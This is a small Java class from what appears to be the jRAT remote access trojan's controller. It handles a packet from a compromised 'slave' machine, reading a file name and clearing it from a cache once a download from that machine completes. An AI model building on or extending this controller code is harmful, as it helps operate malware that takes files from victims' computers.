package se.jrat.controller.packets.incoming;

import java.io.DataInputStream;

import se.jrat.common.io.FileCache;
import se.jrat.controller.Slave;


public class Packet31CompleteServerDownload extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String file = slave.readLine();
		FileCache.clear(file);
	}

}
